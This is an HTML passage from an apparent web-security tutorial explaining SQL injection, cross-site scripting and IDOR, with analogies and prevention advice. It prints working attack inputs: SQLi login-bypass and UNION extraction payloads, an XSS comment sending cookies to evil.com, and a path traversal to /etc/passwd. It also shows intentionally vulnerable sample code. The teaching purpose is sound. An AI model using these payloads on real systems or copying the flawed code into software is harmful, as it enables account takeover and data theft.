<!-- SECTION 3 — SQL INJECTION -->
<!-- ══════════════════════════════════════════ -->
<div class="section" id="s3">
  <h2 class="section-title">3. SQL Injection — Deep Dive</h2>

  <p><strong>SQL Injection (SQLi)</strong> is one of the oldest and most devastating web vulnerabilities, first documented in 1998 by Rain Forest Puppy. It occurs when user-supplied input is incorporated directly into a database query without sanitization, allowing attackers to manipulate the query's logic.</p>

  <h3 class="sub-title">The Analogy</h3>
  <p>Imagine a librarian who blindly follows your instructions. You ask: <em>"Please find me the book by Author: Smith"</em>. The system turns this into <code>SELECT * FROM books WHERE author = 'Smith'</code>. Now what if you say: <em>"Author: Smith' OR '1'='1"</em>? The query becomes:</p>

  <div class="code-block">
    <div class="code-label">SQL</div>
    <pre><span class="c-kw">SELECT</span> * <span class="c-kw">FROM</span> books <span class="c-kw">WHERE</span> author = <span class="c-str">'Smith'</span> <span class="c-kw">OR</span> <span class="c-str">'1'</span>=<span class="c-str">'1'</span></pre>
  </div>

  <p>Since <code>'1'='1'</code> is always true, the query returns <strong>every book in the library</strong>. This is the essence of SQL Injection — injecting logic that changes what the query does.</p>

  <h3 class="sub-title">Types of SQL Injection</h3>

  <div class="vuln-demo">
    <div class="vuln-demo-header">
      <span class="vuln-title">TYPE 1 — In-Band SQLi (Classic)</span>
      <span class="severity-badge sev-critical">Critical</span>
    </div>
    <div class="vuln-demo-body">
      <p>The attack and the result come through the same channel (the web response). The most common and easiest to exploit.</p>
      <h4 class="mini-title">Vulnerable PHP Code</h4>
      <div class="code-block">
        <div class="code-label">PHP</div>
        <pre><span class="c-var">$username</span> = <span class="c-var">$_POST</span>[<span class="c-str">'username'</span>];
<span class="c-kw">$query</span> = <span class="c-str">"SELECT * FROM users WHERE username = '"</span> . <span class="c-var">$username</span> . <span class="c-str">"'"</span>;
<span class="c-var">$result</span> = <span class="c-fn">mysqli_query</span>(<span class="c-var">$conn</span>, <span class="c-var">$query</span>);
<span class="c-cm">// ❌ No validation. Attacker controls the query structure!</span></pre>
      </div>
      <h4 class="mini-title">Attack Payload</h4>
      <div class="code-block">
        <div class="code-label">Input</div>
        <pre><span class="c-str">admin' --</span>
<span class="c-cm">-- Resulting query:</span>
<span class="c-kw">SELECT</span> * <span class="c-kw">FROM</span> users <span class="c-kw">WHERE</span> username = <span class="c-str">'admin'</span> <span class="c-cm">--'</span>
<span class="c-cm">-- Everything after -- is commented out (password check is skipped!)</span></pre>
      </div>
    </div>
  </div>

  <div class="vuln-demo">
    <div class="vuln-demo-header">
      <span class="vuln-title">TYPE 2 — Blind SQLi</span>
      <span class="severity-badge sev-high">High</span>
    </div>
    <div class="vuln-demo-body">
      <p>No data is returned directly. The attacker infers information from the application's behavior — does the page load or not? Does it respond faster or slower?</p>
      <div class="code-block">
        <div class="code-label">Boolean-Based Blind SQLi</div>
        <pre><span class="c-cm">-- Does the database version start with 5?</span>
<span class="c-str">?id=1 AND SUBSTRING(version(),1,1)='5'</span>

<span class="c-cm">-- Time-based: if true, sleep for 5 seconds</span>
<span class="c-str">?id=1 AND SLEEP(5)--</span></pre>
      </div>
      <p>By asking many true/false questions, attackers can reconstruct entire database schemas — character by character.</p>
    </div>
  </div>

  <h3 class="sub-title">Union-Based Extraction</h3>
  <p>When error messages or results are displayed, attackers use <code>UNION SELECT</code> to append their own query and extract data from other tables:</p>
  <div class="code-block">
    <div class="code-label">UNION Attack Example</div>
    <pre><span class="c-cm">-- First, find the number of columns:</span>
<span class="c-str">?id=1 ORDER BY 3--</span>   <span class="c-cm">← No error = at least 3 columns</span>
<span class="c-str">?id=1 ORDER BY 4--</span>   <span class="c-cm">← Error = only 3 columns</span>

<span class="c-cm">-- Then extract data from another table:</span>
<span class="c-str">?id=0 UNION SELECT username, password, 3 FROM users--</span>

<span class="c-cm">-- Result appears where product name normally would!</span></pre>
  </div>

  <h3 class="sub-title">Prevention: The Right Way</h3>
  <ul>
    <li><strong>Parameterized Queries / Prepared Statements</strong> — The #1 fix. User input is treated as data, never as SQL code.</li>
    <li><strong>Stored Procedures</strong> — When implemented securely, isolate SQL logic from user input.</li>
    <li><strong>Input Validation</strong> — Allowlist expected formats (digits only for IDs, etc.).</li>
    <li><strong>Least Privilege</strong> — The database user your app connects with should only have SELECT/INSERT/UPDATE on specific tables — never DROP or admin rights.</li>
    <li><strong>WAF</strong> — A Web Application Firewall can detect and block common SQLi patterns.</li>
  </ul>

  <div class="code-block">
    <div class="code-label">PHP — Secure Parameterized Query</div>
    <pre><span class="c-var">$stmt</span> = <span class="c-var">$conn</span>-&gt;<span class="c-fn">prepare</span>(<span class="c-str">"SELECT * FROM users WHERE username = ?"</span>);
<span class="c-var">$stmt</span>-&gt;<span class="c-fn">bind_param</span>(<span class="c-str">"s"</span>, <span class="c-var">$username</span>);
<span class="c-var">$stmt</span>-&gt;<span class="c-fn">execute</span>();
<span class="c-cm">// ✅ Input is always treated as data, never as SQL!</span></pre>
  </div>
</div>

<!-- ══════════════════════════════════════════ -->
<!-- SECTION 4 — XSS -->
<!-- ══════════════════════════════════════════ -->
<div class="section" id="s4">
  <h2 class="section-title">4. Cross-Site Scripting (XSS)</h2>

  <p><strong>Cross-Site Scripting (XSS)</strong> occurs when an attacker injects malicious scripts into content delivered to other users' browsers. Unlike SQL Injection which targets the server, XSS targets the <em>victim's browser</em>. The attacker essentially hijacks the browser's trust in the website.</p>

  <h3 class="sub-title">The Analogy</h3>
  <p>Imagine a community notice board in a bank lobby. The bank staff (the server) posts notices, and customers (other users) read them. If an attacker slips their own "notice" onto the board that says <em>"Scan this QR code to verify your account"</em> — and customers trust it because it's on the official board — that's XSS. The attacker exploits trust.</p>

  <h3 class="sub-title">Three Types of XSS</h3>

  <div class="vuln-demo">
    <div class="vuln-demo-header">
      <span class="vuln-title">Stored XSS (Persistent)</span>
      <span class="severity-badge sev-critical">Most Dangerous</span>
    </div>
    <div class="vuln-demo-body">
      <p>The malicious script is <strong>saved in the database</strong> and served to every user who views the page. A comment, profile bio, or forum post that contains a script will execute in every visitor's browser.</p>
      <div class="code-block">
        <div class="code-label">Malicious Comment Posted by Attacker</div>
        <pre><span class="c-cm">Nice article!</span> <span class="c-tag">&lt;script&gt;</span>
  <span class="c-fn">fetch</span>(<span class="c-str">'https://evil.com/steal?c='</span> + <span class="c-fn">btoa</span>(document.cookie))
<span class="c-tag">&lt;/script&gt;</span>
<span class="c-cm">// Every visitor who loads this comment loses their session cookie!</span></pre>
      </div>
    </div>
  </div>

  <div class="vuln-demo">
    <div class="vuln-demo-header">
      <span class="vuln-title">Reflected XSS</span>
      <span class="severity-badge sev-high">High</span>
    </div>
    <div class="vuln-demo-body">
      <p>The malicious payload is in the URL. The server "reflects" it back in the response without storing it. The attacker sends the crafted link to a victim, who clicks it.</p>
      <div class="code-block">
        <div class="code-label">Malicious URL (sent via phishing email)</div>
        <pre><span class="c-str">https://bank.com/search?q=&lt;script&gt;stealCookies()&lt;/script&gt;</span>

<span class="c-cm">// Server renders: "You searched for: &lt;script&gt;stealCookies()&lt;/script&gt;"</span>
<span class="c-cm">// Browser executes the script as if the bank wrote it!</span></pre>
      </div>
    </div>
  </div>

  <div class="vuln-demo">
    <div class="vuln-demo-header">
      <span class="vuln-title">DOM-Based XSS</span>
      <span class="severity-badge sev-medium">Medium</span>
    </div>
    <div class="vuln-demo-body">
      <p>The vulnerability is in the client-side JavaScript itself — the server never sees the malicious payload. The script reads from a dangerous source (like <code>window.location.hash</code>) and writes it directly to the DOM.</p>
      <div class="code-block">
        <div class="code-label">Vulnerable JavaScript</div>
        <pre><span class="c-cm">// Reads fragment from URL: #&lt;img src=x onerror=alert(1)&gt;</span>
<span class="c-kw">const</span> <span class="c-var">name</span> = location.hash.slice(<span class="c-num">1</span>);
document.getElementById(<span class="c-str">'greeting'</span>).innerHTML = <span class="c-str">'Hello, '</span> + <span class="c-var">name</span>;
<span class="c-cm">// ❌ innerHTML interprets HTML tags — including &lt;script&gt; and event handlers!</span></pre>
      </div>
    </div>
  </div>

  <h3 class="sub-title">What Can XSS Do?</h3>
  <ul>
    <li>Steal session cookies → account takeover</li>
    <li>Capture keystrokes (keyboard logging)</li>
    <li>Redirect users to phishing pages</li>
    <li>Make API calls on behalf of the victim (CSRF-like actions)</li>
    <li>Deface websites (change visible content)</li>
    <li>Install browser-based cryptominers</li>
  </ul>

  <h3 class="sub-title">Prevention</h3>
  <ul>
    <li><strong>Output Encoding</strong> — Always encode user data before inserting into HTML (<code>&lt;</code> → <code>&amp;lt;</code>). Use your framework's template engine which does this automatically.</li>
    <li><strong>Content Security Policy (CSP)</strong> — HTTP header that tells the browser which scripts are trusted. Blocks inline scripts and external sources.</li>
    <li><strong>HttpOnly Cookies</strong> — Prevents JavaScript from reading session cookies, making cookie theft harder.</li>
    <li><strong>Use <code>textContent</code> instead of <code>innerHTML</code></strong> — Never insert user data as HTML.</li>
    <li><strong>Input Validation</strong> — Reject or sanitize unexpected characters on the server side.</li>
  </ul>
</div>

<!-- ══════════════════════════════════════════ -->
<!-- SECTION 5 — IDOR -->
<!-- ══════════════════════════════════════════ -->
<div class="section" id="s5">
  <h2 class="section-title">5. IDOR &amp; Broken Access Control</h2>

  <p><strong>Insecure Direct Object Reference (IDOR)</strong> is a classic access control vulnerability where an application exposes direct references to internal objects (like database IDs, filenames, or usernames) and fails to verify whether the requesting user is authorized to access them.</p>

  <h3 class="sub-title">The Analogy</h3>
  <p>You check into a hotel and receive key card for Room 101. The hotel's check-in system assigns rooms by incrementing numbers. If you discover that typing Room 102 into the elevator panel also opens — because the hotel doesn't verify that key 101 belongs to room 101 — that's IDOR. You found a reference (room number) and the system didn't check if you're allowed to use it.</p>

  <div class="vuln-demo">
    <div class="vuln-demo-header">
      <span class="vuln-title">IDOR — Invoice Access Exploit</span>
      <span class="severity-badge sev-critical">Critical</span>
    </div>
    <div class="vuln-demo-body">
      <p>You log in and see your invoice at:</p>
      <div class="code-block">
        <div class="code-label">URL</div>
        <pre>https://shop.com/invoice?id=<span class="c-num">8473</span></pre>
      </div>
      <p>You change the ID to 8472, 8471, 8470… and can read every customer's invoice. The server only checks if you're <em>logged in</em> — not if you own that specific invoice.</p>
      <div class="code-block">
        <div class="code-label">Vulnerable Backend (Python)</div>
        <pre><span class="c-kw">def</span> <span class="c-fn">get_invoice</span>(request):
    invoice_id = request.GET[<span class="c-str">'id'</span>]
    <span class="c-cm"># ❌ Only checks auth, not ownership!</span>
    <span class="c-kw">if</span> request.user.is_authenticated:
        <span class="c-kw">return</span> Invoice.objects.get(id=invoice_id)

<span class="c-cm"># ✅ Secure fix — filter by current user:</span>
<span class="c-kw">def</span> <span class="c-fn">get_invoice_secure</span>(request):
    invoice_id = request.GET[<span class="c-str">'id'</span>]
    <span class="c-kw">return</span> Invoice.objects.get(id=invoice_id, user=request.user)
    <span class="c-cm"># Throws 404 if invoice doesn't belong to the user!</span></pre>
      </div>
    </div>
  </div>

  <h3 class="sub-title">Other Broken Access Control Examples</h3>
  <ul>
    <li><strong>Privilege Escalation</strong> — A regular user modifies a POST body to set <code>role=admin</code></li>
    <li><strong>Forced Browsing</strong> — Navigating directly to <code>/admin/users</code> without logging in as admin</li>
    <li><strong>Method Override</strong> — Bypassing restrictions by changing <code>GET</code> to <code>PUT</code> or <code>DELETE</code></li>
    <li><strong>Path Traversal</strong> — Using <code>../../etc/passwd</code> in file parameters to read system files</li>
  </ul>

  <h3 class="sub-title">Prevention</h3>
  <ul>
    <li>Enforce authorization on every request — never trust client-side roles or IDs</li>
    <li>Use indirect references (UUIDs or tokens) instead of sequential integers</li>
    <li>Implement role-based access control (RBAC) at the server level</li>
    <li>Log all access control failures and alert on suspicious patterns</li>
    <li>Test authorization in every code review and penetration test</li>
  </ul>
</div>

